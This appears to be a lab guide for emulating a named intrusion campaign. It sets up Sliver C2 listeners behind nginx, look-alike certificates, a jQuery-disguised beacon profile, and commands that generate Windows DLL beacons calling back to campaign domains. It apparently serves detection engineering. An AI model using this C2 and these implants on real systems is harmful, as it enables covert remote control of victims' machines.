# C2 layout

The C2 role is a Sliver server on the Linux host. Two HTTPS listeners carry the two stages, an HTTP
listener carries the beacon's plain traffic, and nginx sits in front of both so the hostnames and the
URI paths match the campaign profile.

| Listener | Bind | Hostname | Serves |
|---|---|---|---|
| HTTPS 8444 | 127.0.0.1 | `perdefue.fr` | Foothold module (`compareforfor.jpg`) |
| HTTPS 8443 | 127.0.0.1 | `checkauj.com` | Main beacon and pivot beacon |
| HTTP 8081 | 127.0.0.1 | `five.azureedge.net` | Beacon HTTP channel |

`nginx-c0015.conf` routes 443 by SNI and rewrites the two jQuery paths on port 80. The listeners bind
to loopback so nothing is reachable except through the front.

## Certificates

The campaign certificates are self-signed with an organisation of `GG EST` and a common name of
`perdefue.fr` on the loader, and a public CA certificate for `checkauj.com` on the beacon. The lab
issues its own certificates with the same subject fields; the issuer differs, and rules must key on
the subject or on the connection properties rather than on a public CA chain.

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -subj "/O=GG EST/CN=perdefue.fr" \
  -keyout perdefue.key -out perdefue.crt

openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -subj "/CN=checkauj.com" -addext "subjectAltName=DNS:checkauj.com,DNS:www.checkauj.com" \
  -keyout checkauj.key -out checkauj.crt
```

## HTTP C2 profile

The campaign beacon polls `/jquery-3.3.1.min.js` and posts results to `/jquery-3.3.2.min.js`, with a
60 second sleep and 37 percent jitter. Sliver profiles carry the path list; the two paths are exported,
edited, and imported back:

```text
sliver > c2profiles new -n c0015-jquery
sliver > c2profiles export -n c0015-jquery -f /opt/c0015/profile.json
#   set the paths to /jquery-3.3.1.min.js and /jquery-3.3.2.min.js
#   set the user agent to a browser string, poll timeout to 60
sliver > c2profiles import -f /opt/c0015/profile.json
```

Jitter in Sliver is expressed in seconds, not percent. A 60 second interval with 37 percent jitter is
`--seconds 60 --jitter 22`.

## Implant generation

```text
# foothold module, started by regsvr32 through the exported DllRegisterServer
generate --name compareforfor --os windows --arch amd64 --format shared \
  --exports DllRegisterServer --https perdefue.fr:443 --save /opt/c0015/build

# main beacon, started by rundll32 with no export argument
generate beacon --name D8B3 --os windows --arch amd64 --format shared \
  --exports DllRegisterServer --run-at-load --seconds 60 --jitter 22 \
  --http five.azureedge.net --c2profile c0015-jquery --save /opt/c0015/build

# pivot beacon, started by rundll32 with the DllRegisterServer argument
generate beacon --name 143 --os windows --arch amd64 --format shared \
  --exports DllRegisterServer --seconds 60 --jitter 22 \
  --http checkauj.com --c2profile c0015-jquery --save /opt/c0015/build

# fallback beacon, pointed at a name that does not resolve
generate beacon --name D574 --os windows --arch amd64 --format shared \
  --exports DllRegisterServer --run-at-load \
  --https volga.azureedge.net:443 --save /opt/c0015/build
```

A second, short-interval build of the main and pivot beacons is useful for walkthroughs where waiting
60 seconds per task is impractical: `--seconds 15 --jitter 5`. Record which build was used; the
callback cadence is part of the observable behaviour.

## Verification

| Check | Command | Expected |
|---|---|---|
| Certificate | `openssl s_client -connect 192.168.50.100:443 -servername checkauj.com` | subject `CN=checkauj.com` |
| HTTP path | `curl -k https://checkauj.com/jquery-3.3.1.min.js` | served by the listener, not the nginx 404 |
| Beacon callback | `sessions` in the console | session with the expected hostname |
| Fallback failure | `nslookup volga.azureedge.net` on WS01 | non-existent domain |
